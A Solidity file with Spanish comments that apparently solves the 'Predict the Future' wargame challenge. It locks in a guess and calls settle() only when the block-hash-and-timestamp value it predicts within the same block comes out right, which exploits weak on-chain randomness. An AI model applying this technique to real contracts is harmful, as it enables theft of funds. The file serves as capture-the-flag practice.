pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    function PredictTheFutureChallenge() public payable {}

    function isComplete() public view returns (bool) {}

    function lockInGuess(uint8 n) public payable {}

    function settle() public {}
}

contract CTE_PredictTheFutureSolution {
    address private targetContract = 0x884A62868caC48635D42F4942ce6488fac69d1a1;
    address public owner;
    PredictTheFutureChallenge target;
    
    // Para evitar que alguien mas saque el ether del contrato
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    // Comprueba que efectivamente yo sea el dueño (debug)
    function isOwner() public view returns(bool) {
        return msg.sender == owner;
    }
    
    // Constructor, guardo un puntero al contrato objetivo en target
    constructor() public payable {
        owner = msg.sender;
        target = PredictTheFutureChallenge(targetContract);
    }
    
    // Fallback para recibir fondos
    function() public payable { }
    
    // Para recuperar el ether del contrato, manda solo al owner
    function recoverFunds() public payable onlyOwner {
        owner.transfer(address(this).balance);
    }
    
    // Bloqueo el valor de guess en el contrato destino, ya que el que puede adivinar es solo el que bloqueo
    function makeGuess() public payable {
        require(msg.value == 1 ether);
        target.lockInGuess.value(msg.value)(0);
    }
    
    // Llamo a la funcion del contrato destino solo si se cumple la condicion, en caso contrario pierdo los fondos
    function solveChallenge() public payable {
        require(0 == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10);
        target.settle();
    }
}